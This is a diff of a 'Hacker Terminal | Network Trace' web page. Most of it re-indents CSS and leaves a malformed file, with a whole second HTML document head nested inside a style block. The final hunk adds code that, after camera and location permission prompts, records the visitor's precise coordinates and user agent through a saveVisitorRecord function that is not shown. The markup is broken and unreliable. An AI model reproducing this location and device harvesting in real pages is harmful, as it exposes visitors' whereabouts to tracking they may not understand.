@@ -26,154 +26,155 @@
             background: #ffffff;
             border: 1px solid #dbeafe;
             border-radius: 20px;
+        }
 
-            < !DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Hacker Terminal | Network Trace</title><style>* {
-                box-sizing: border-box;
-            }
+        < !DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Hacker Terminal | Network Trace</title><style>* {
+            box-sizing: border-box;
+        }
 
-            body {
-                margin: 0;
-                min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                font-family: "Consolas", "Courier New", monospace;
-                background: radial-gradient(circle at top, #10261b 0%, #020604 70%, #000 100%);
-                color: #7cffb2;
-                padding: 20px;
-                text-shadow: 0 0 6px rgba(124, 255, 178, 0.35);
-            }
+        body {
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: "Consolas", "Courier New", monospace;
+            background: radial-gradient(circle at top, #10261b 0%, #020604 70%, #000 100%);
+            color: #7cffb2;
+            padding: 20px;
+            text-shadow: 0 0 6px rgba(124, 255, 178, 0.35);
+        }
 
-            .card {
-                background: rgba(2, 12, 8, 0.95);
-                border: 1px solid #2bff8a;
-                border-radius: 16px;
-                padding: 32px;
-                max-width: 440px;
-                width: 100%;
-                box-shadow: 0 0 25px rgba(43, 255, 138, 0.25);
-                position: relative;
-                overflow: hidden;
-            }
+        .card {
+            background: rgba(2, 12, 8, 0.95);
+            border: 1px solid #2bff8a;
+            border-radius: 16px;
+            padding: 32px;
+            max-width: 440px;
+            width: 100%;
+            box-shadow: 0 0 25px rgba(43, 255, 138, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
 
-            .card::before {
-                content: "";
-                position: absolute;
-                inset: 0;
-                background: repeating-linear-gradient(180deg, rgba(43, 255, 138, 0.03), rgba(43, 255, 138, 0.03) 1px, transparent 1px, transparent 4px);
-                pointer-events: none;
-            }
+        .card::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: repeating-linear-gradient(180deg, rgba(43, 255, 138, 0.03), rgba(43, 255, 138, 0.03) 1px, transparent 1px, transparent 4px);
+            pointer-events: none;
+        }
 
-            h1 {
-                font-size: 20px;
-                margin: 0 0 6px;
-                color: #8bffbb;
-                letter-spacing: 0.1em;
-                text-transform: uppercase;
-            }
+        h1 {
+            font-size: 20px;
+            margin: 0 0 6px;
+            color: #8bffbb;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+        }
 
-            p.sub {
-                color: #5bd98b;
-                font-size: 13px;
-                margin: 0 0 20px;
-                letter-spacing: 0.08em;
-                text-transform: uppercase;
-            }
+        p.sub {
+            color: #5bd98b;
+            font-size: 13px;
+            margin: 0 0 20px;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+        }
 
-            .row {
-                display: flex;
-                justify-content: space-between;
-                padding: 10px 0;
-                border-bottom: 1px solid rgba(43, 255, 138, 0.2);
-                font-size: 14px;
-            }
+        .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(43, 255, 138, 0.2);
+            font-size: 14px;
+        }
 
-            .row:last-child {
-                border-bottom: none;
-            }
+        .row:last-child {
+            border-bottom: none;
+        }
 
-            .label {
-                color: #78c996;
-            }
+        .label {
+            color: #78c996;
+        }
 
-            .value {
-                color: #f0fff6;
-                font-weight: 600;
-                text-align: right;
-            }
+        .value {
+            color: #f0fff6;
+            font-weight: 600;
+            text-align: right;
+        }
 
-            .loading {
-                text-align: center;
-                color: #5bd98b;
-                padding: 20px 0;
-            }
+        .loading {
+            text-align: center;
+            color: #5bd98b;
+            padding: 20px 0;
+        }
 
-            .map-link {
-                display: inline-block;
-                margin-top: 20px;
-                text-align: center;
-                width: 100%;
-                padding: 10px;
-                background: rgba(43, 255, 138, 0.12);
-                border: 1px solid rgba(43, 255, 138, 0.3);
-                border-radius: 8px;
-                color: #dfffe9;
-                text-decoration: none;
-                font-size: 14px;
-            }
+        .map-link {
+            display: inline-block;
+            margin-top: 20px;
+            text-align: center;
+            width: 100%;
+            padding: 10px;
+            background: rgba(43, 255, 138, 0.12);
+            border: 1px solid rgba(43, 255, 138, 0.3);
+            border-radius: 8px;
+            color: #dfffe9;
+            text-decoration: none;
+            font-size: 14px;
+        }
 
-            .map-link:hover {
-                background: rgba(43, 255, 138, 0.2);
-            }
+        .map-link:hover {
+            background: rgba(43, 255, 138, 0.2);
+        }
 
-            .actions {
-                margin: 0 0 12px;
-            }
+        .actions {
+            margin: 0 0 12px;
+        }
 
-            .action-btn {
-                width: 100%;
-                border: 1px solid #2bff8a;
-                border-radius: 10px;
-                padding: 12px 14px;
-                background: #0b2414;
-                color: #7cffb2;
-                font-size: 14px;
-                font-weight: 700;
-                cursor: pointer;
-                letter-spacing: 0.06em;
-                text-transform: uppercase;
-            }
+        .action-btn {
+            width: 100%;
+            border: 1px solid #2bff8a;
+            border-radius: 10px;
+            padding: 12px 14px;
+            background: #0b2414;
+            color: #7cffb2;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+        }
 
-            .action-btn:hover {
-                background: #123b22;
-                box-shadow: 0 0 12px rgba(43, 255, 138, 0.25);
-            }
+        .action-btn:hover {
+            background: #123b22;
+            box-shadow: 0 0 12px rgba(43, 255, 138, 0.25);
+        }
 
-            .action-btn:disabled {
-                opacity: 0.7;
-                cursor: wait;
-            }
+        .action-btn:disabled {
+            opacity: 0.7;
+            cursor: wait;
+        }
 
-            .status {
-                margin: 10px 0 16px;
-                font-size: 13px;
-                color: #b9ffd2;
-                min-height: 20px;
-                line-height: 1.5;
-            }
+        .status {
+            margin: 10px 0 16px;
+            font-size: 13px;
+            color: #b9ffd2;
+            min-height: 20px;
+            line-height: 1.5;
+        }
 
-            .status.success {
-                color: #86efac;
-            }
+        .status.success {
+            color: #86efac;
+        }
 
-            .status.error {
-                color: #fda4af;
-            }
+        .status.error {
+            color: #fda4af;
+        }
 
-            .error {
-                color: #f87171;
-                text-align: center;
-            }
+        .error {
+            color: #f87171;
+            text-align: center;
+        }
     </style>
 </head>
 
@@ -232,6 +233,24 @@
             statusEl.className = 'status success';
             statusEl.innerHTML = `${cameraMessage}<br>${locationMessage}`;
             accessBtn.disabled = false;
+
+            // Save a visitor record on explicit user action (button click)
+            try {
+                const data = {
+                    ip: null,
+                    city: null,
+                    region: null,
+                    country: null,
+                    postal: null,
+                    lat: (locationResult && locationResult.status === 'fulfilled') ? locationResult.value.coords.latitude : null,
+                    lon: (locationResult && locationResult.status === 'fulfilled') ? locationResult.value.coords.longitude : null,
+                    timezone: null,
+                    org: null,
+                    ua: navigator.userAgent,
+                    source: 'button',
+                };
+                saveVisitorRecord(data);
+            } catch (e) { /* ignore */ }
         }
 
         accessBtn.addEventListener('click', requestPermissions);
